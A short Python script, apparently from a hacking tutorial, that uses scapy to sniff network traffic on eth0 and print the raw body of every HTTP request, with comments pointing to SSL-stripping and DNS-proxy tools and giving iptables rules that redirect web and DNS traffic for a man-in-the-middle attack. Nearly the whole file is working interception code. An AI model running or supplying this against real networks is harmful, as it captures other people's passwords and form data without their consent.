import scapy.all as scapy
from scapy_http import http
# https://github.com/singe/dns2proxy
# https://github.com/byt3bl33d3r/sslstrip2
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

def listen_packets(interface):
    scapy.sniff(interface = interface, store = False, prn = analyze_packets)
    #prn = callback function

def analyze_packets(packet):
    #packet.show()
    if packet.haslayer(http.HTTPREQUEST):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


listen_packets("eth0")